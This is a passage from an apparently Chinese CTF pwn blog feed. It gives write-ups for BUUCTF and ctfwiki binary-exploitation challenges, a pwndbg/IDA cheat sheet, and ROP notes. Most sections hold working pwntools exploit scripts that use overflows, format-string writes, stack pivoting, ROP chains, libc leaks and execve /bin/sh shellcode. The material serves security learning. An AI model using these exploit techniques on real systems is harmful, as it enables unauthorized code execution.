class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27627</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">11</span>, &#123;<span class="number">0x804A004</span>:<span class="number">0x080485DF</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="25-x-ctf-b0verfl0w"><a href="#25-x-ctf-b0verfl0w" class="headerlink" title="25.x_ctf_b0verfl0w"></a>25.x_ctf_b0verfl0w</h1><p><img src="https://i.loli.net/2021/09/22/Tou3dkIV6LNc9YQ.png" alt="image-20210922100725331"></p><p><img src="https://i.loli.net/2021/09/22/zse97RVOfwTovBU.png"></p><p><img src="https://i.loli.net/2021/09/22/djorzAha6uWXtDg.png" alt="image-20210922101140597"></p><p>hint函数给了一个jmp esp。因为栈的长度不够构造ROP，考虑使用stack pivoting。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26868</span>)</span><br><span class="line">shellcode=<span class="string">b&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line">jmp_esp=<span class="number">0x8048504</span></span><br><span class="line">sub_esp_jmp = asm(<span class="string">&#x27;sub esp, 0x28;jmp esp&#x27;</span>)</span><br><span class="line">payload=shellcode+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="built_in">len</span>(shellcode))+<span class="string">b&#x27;bpbp&#x27;</span>+p32(jmp_esp)+sub_esp_jmp</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="26-ciscn-2019-es-2"><a href="#26-ciscn-2019-es-2" class="headerlink" title="26.ciscn_2019_es_2"></a>26.ciscn_2019_es_2</h1><p><img src="https://i.loli.net/2021/09/23/hCG3RqIOdA9vw4N.png" alt="image-20210923143151685.png"></p><p><img src="https://i.loli.net/2021/09/23/6fgAD5cRO97xZmq.png" alt="image-20210923143441935"></p><p>栈溢出的空间只有8，只能正好覆盖返回地址。考虑使用<a href="https://kazamayc.github.io/2021/05/27/pwn/">frame faking栈转移</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27284</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_2019_es_2&#x27;</span>)</span><br><span class="line">system=elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">leave=<span class="number">0x080484b8</span></span><br><span class="line"><span class="comment"># 0x080484b8 : leave ; ret</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x27</span>+<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">stack=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">success(<span class="string">&quot;stack: &quot;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line">esp=stack-<span class="number">0x38</span></span><br><span class="line">payload=(p32(esp)+p32(system)+p32(main)+p32(esp+<span class="number">0x10</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p32(esp)+p32(leave)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="27-ez-pz-hackover-2016"><a href="#27-ez-pz-hackover-2016" class="headerlink" title="27.ez_pz_hackover_2016"></a>27.ez_pz_hackover_2016</h1><p>从此题开始使用python2</p><p><img src="https://i.loli.net/2021/09/23/XBY8SZ2CDfGAqhJ.png" alt="image-20210923163546066"></p><p><img src="https://i.loli.net/2021/09/23/wzcSTyqtAboVCGF.png" alt="image-20210923170129408"></p><p>做法就是挂上gdb硬调。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#gdb调试脚本</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#r=remote(&quot;node4.buuoj.cn&quot;,29257)</span></span><br><span class="line">r=process(<span class="string">&quot;./ez_pz_hackover_2016&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;crash: &#x27;</span>)</span><br><span class="line">gdb.attach(r,<span class="string">&quot;b *0x80485F7&quot;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(r.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;stack: &quot;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">payload=<span class="string">&quot;crashme\x00&quot;</span>+<span class="number">4</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="comment">#payload=&quot;crashme\x00&quot;+18*&#x27;a&#x27;+p32(stack-28)+shellcode</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/25/MyDnrKpgvwkPGxT.png" alt="image-20210925172437419"></p><p><img src="https://i.loli.net/2021/09/25/fSZF45lHz7kvRI2.png" alt="image-20210925172558750.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用ebp地址减去crashme地址，发现偏移只有22</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">0xfff8b678</span>-<span class="number">0xfff8b662</span></span><br><span class="line"><span class="number">22</span></span><br><span class="line"><span class="comment">#%p地址减去shellcode所在地址，偏移为28</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">0xfff8b680</span>-<span class="number">0xfff8b69c</span></span><br><span class="line">-<span class="number">28</span></span><br></pre></td></tr></table></figure><p>所需条件满足，构成exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">r=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29257</span>)</span><br><span class="line"><span class="comment">#r=process(&quot;./ez_pz_hackover_2016&quot;)</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;crash: &#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r,&quot;b *0x80485F7&quot;)</span></span><br><span class="line">stack=<span class="built_in">int</span>(r.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;stack: &quot;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">payload=<span class="string">&quot;crashme\x00&quot;</span>+<span class="number">18</span>*<span class="string">&#x27;a&#x27;</span>+p32(stack-<span class="number">28</span>)+shellcode</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="28-jarvisoj-tell-me-something"><a href="#28-jarvisoj-tell-me-something" class="headerlink" title="28.jarvisoj_tell_me_something"></a>28.jarvisoj_tell_me_something</h1><p>直接溢出后门函数，因为没有压入ebp，所以不用+8。</p><p><img src="https://i.loli.net/2021/09/25/7JrXTpPnKs1EUQC.png" alt="image-20210925182920959.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29908</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./guestbook&quot;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *0x40050A&quot;)</span></span><br><span class="line">hack=<span class="number">0x400620</span></span><br><span class="line">payload=<span class="number">0x88</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0x400620</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;message:\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="29-Black-Watch-入群题-PWN"><a href="#29-Black-Watch-入群题-PWN" class="headerlink" title="29.[Black Watch 入群题]PWN"></a>29.[Black Watch 入群题]PWN</h1><p><img src="https://i.loli.net/2021/09/28/BP1zLrUyTwcJhSk.png" alt="image-20210928103935452.png"></p><p>代码逻辑是写入两次，第一次写入bss段，第二次写入覆盖返回地址。因为堆栈不可执行，所以思路是栈转移到bss段进行rop。因为没有system函数，所以进行泄漏libc利用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27277</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./spwn&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./spwn&quot;</span>)</span><br><span class="line"><span class="comment">#def debug(cmd=&quot;b main&quot;):</span></span><br><span class="line"><span class="comment">#    gdb.attach(p, cmd)</span></span><br><span class="line"><span class="comment">#    pause()</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">leave_ret=<span class="number">0x8048408</span></span><br><span class="line">bss_addr=<span class="number">0x804A300</span></span><br><span class="line">payload=p32(main)+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;What is your name?&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;What do you want to say?&quot;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p32(bss_addr)+p32(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">write_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">success(<span class="string">&#x27;write_addr: &#x27;</span>,<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;What is your name?&quot;</span>)</span><br><span class="line">payload=p32(main)+p32(system)+p32(main)+p32(bin_sh)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;What do you want to say?&quot;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p32(bss_addr)+p32(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="30-picoctf-2018-rop-chain"><a href="#30-picoctf-2018-rop-chain" class="headerlink" title="30.picoctf_2018_rop chain"></a>30.picoctf_2018_rop chain</h1><p><img src="https://i.loli.net/2021/09/29/X1wTvbLA2g3z7jc.png" alt="image-20210929081239783"></p><p>程序存在后门函数flag，读取flag的条件是win1和win2相等，a1=-559039827。我们可以调用win_function1和win_function2修改win的值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a=<span class="number">-559039827</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%x&quot;</span>,a);</span><br><span class="line"><span class="comment">//0xdeadbaad</span></span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28277</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./PicoCTF_2018_rop_chain&quot;)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Enter your input&gt; &quot;</span>)</span><br><span class="line">fun1=<span class="number">0x80485CB</span></span><br><span class="line">fun2=<span class="number">0x80485D8</span></span><br><span class="line">flag=<span class="number">0x804862B</span></span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+p32(fun1)+p32(fun2)+p32(flag)+p32(<span class="number">0xbaaaaaad</span>)+p32(<span class="number">0xdeadbaad</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 2021年6月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[工具使用] pwn的工具使用</title>
      <link href="/2021/06/01/pwn%E7%9A%84%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/06/01/pwn%E7%9A%84%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># 运行</span><br><span class="line">run [arg]         运行且传入参数，简写r</span><br><span class="line">set args [arg]    设置命令行参数</span><br><span class="line">[enter]           执行上一条指令</span><br><span class="line">return            执行函数到返回，简写ret</span><br><span class="line">finish            执行程序到返回，简写fini</span><br><span class="line">quit              退出，简写q</span><br><span class="line"></span><br><span class="line"># 调试</span><br><span class="line">next              单步步过高级语言，简写n</span><br><span class="line">nexti             单步步过汇编语言，简写ni</span><br><span class="line">step              单步步入高级语言，简写s</span><br><span class="line">stepi             单步步入汇编语言，简写si</span><br><span class="line"></span><br><span class="line"># 断点</span><br><span class="line">break             断点，简写b</span><br><span class="line">b *0x40000        在0x40000的地址上下断点</span><br><span class="line">info break        查看所有断点，简写info b</span><br><span class="line">del [break num]   删除断点</span><br><span class="line">c                 继续运行</span><br><span class="line"></span><br><span class="line"># 查看信息</span><br><span class="line">vmmap             显示当前进程空间内存分布</span><br><span class="line">stack n           显示栈上的值，n是显示内存的长度</span><br><span class="line">x /&lt;n/f/u&gt; &lt;addr&gt; nfu见上下，用于查看内存中的地址</span><br><span class="line"># 类型f</span><br><span class="line">t                 二进制</span><br><span class="line">o                 八进制</span><br><span class="line">d                 十进制</span><br><span class="line">u                 十六进制无符号</span><br><span class="line">a                 十六进制有符号</span><br><span class="line">c                 字符</span><br><span class="line">f                 浮点</span><br><span class="line"># 字节数</span><br><span class="line">b                 1字节</span><br><span class="line">h                 2字节</span><br><span class="line">w                 4字节</span><br><span class="line">g                 8字节</span><br><span class="line"></span><br><span class="line">print $rdx        打印rdx寄存器上的值</span><br><span class="line">print *$rdx       打印rdx寄存器上的地址存的值</span><br><span class="line">print /f &lt;addr&gt;   可以使用类型打印数据</span><br><span class="line">print symbol      打印符号</span><br></pre></td></tr></table></figure><h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctrl+s              查看段表</span><br><span class="line">ctrl+x              找到调用它的函数</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 2021年6月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[write up] ctfwiki学习</title>
      <link href="/2021/05/28/ctfwiki%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/05/28/ctfwiki%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-Basic-ROP"><a href="#0x00-Basic-ROP" class="headerlink" title="0x00 Basic ROP"></a>0x00 Basic ROP</h1><blockquote><p>wiki下载的ret2shellcode，bss段没有可执行权限</p><p>ret2libc3用LibcSearcher搜不到libc库</p></blockquote><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/ctfwiki/ret2text">ret2text</a></p><p><img src="https://i.loli.net/2021/05/28/XPAyBWEGrDzTJk8.png" alt="image-20210528110345985"></p><p><img src="https://i.loli.net/2021/05/28/Ds5vRmAi3tKuOa6.png" alt="image-20210528111444922"></p><p>gets函数存在栈溢出，在secure函数可以发现存在<code>system(&#39;/bin/sh&#39;)</code>。</p><p><img src="https://i.loli.net/2021/05/28/IMW5KpC2lLNyd31.png" alt="image-20210528111724529"></p><p>然后计算gets的buf与返回地址的偏移</p><p>可以看到s的地址是FFBDD5BC</p><p><img src="https://i.loli.net/2021/05/28/7K5QVj2CbgosNhd.png" alt="image-20210528113518323"></p><p>EBP的地址是FFBDD628</p><p><img src="https://i.loli.net/2021/05/28/fiwSX9yE7nUJcQs.png" alt="image-20210528113530604"></p><p><img src="https://i.loli.net/2021/05/28/iOoHXLvTKCUuFpS.png" alt="image-20210528113701049"></p><p>所以返回地址的偏移就是108+4=112。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>+p64(<span class="number">0x0804863A</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/ctfwiki/rop">ret2syscall</a></p><p><img src="https://i.loli.net/2021/05/28/yPvGp9ODw5WFUTN.png" alt="image-20210528125649383"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you plan to do?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个需要调用execve()函数，这个函数成功调用需要一定条件，<code>edx=0 ecx=0 [ebx]=&#39;/bin/sh&#39; eax=0xb int 0x80</code></p><p>然后使用ROPgadget寻找gadgets，达成条件即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">pop_eax=<span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">binsh=<span class="number">0x080be408</span></span><br><span class="line">int80=<span class="number">0x08049421</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>+p32(pop_eax)+p32(<span class="number">0xb</span>)+p32(pop_edx_ecx_ebx_ret)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(binsh)+p32(int80))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h2><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/ctfwiki/ret2libc1">ret2libc1</a></p><p><img src="https://i.loli.net/2021/05/28/6Ow3l57jcEeqPIX.png" alt="image-20210528150232141"></p><p>在ida找到system函数</p><p><img src="https://i.loli.net/2021/05/28/exn3rX87c6mi1NJ.png" alt="image-20210528150425252"></p><p><code>shift+F12</code>找到/bin/sh</p><p><img src="https://i.loli.net/2021/05/28/bSOEHJpD8YucMaz.png" alt="image-20210528150551335"></p><p>直接调用函数利用即可</p><p>要注意一点，32位系统调用函数的方式</p><p><img src="https://i.loli.net/2021/05/28/n3eyB4mjQa6qWsp.png" alt="image-20210528151028736"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line">binsh=<span class="number">0x08048720</span></span><br><span class="line">system=<span class="number">0x08048460</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span>+p32(system)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(binsh))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h2><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/ctfwiki/ret2libc2">ret2libc2</a></p><p><img src="https://i.loli.net/2021/05/28/TyNHrg1kLDcUp9J.png" alt="image-20210528151242199"></p><p>这个程序和上面的区别就是没给<code>/bin/sh</code>字符串</p><p>首先要在bss段找到可以存放字符串的值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面<span class="comment"># gdb ret2libc2</span></span><br><span class="line">pwndbg&gt; start</span><br><span class="line">pwndbg&gt; vmmap</span><br></pre></td></tr></table></figure><p>可以看到第三行可读可写</p><p><img src="https://i.loli.net/2021/05/28/UjvuAgPqL8bwiCQ.png" alt="image-20210528151318129"></p><p>ida按g跳转到0x804a000，然后在0x804a000到0x804b000之间寻找bss段可用的地方，会看到有个数组。所以可以直接用这个存放数据。</p><p><img src="https://i.loli.net/2021/05/28/YNgdGHpStExIPQ1.png" alt="image-20210528152132703"></p><p>其他和上一个基本上一样，只是多了gets函数。只要理解了上面的就没啥问题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line">system=<span 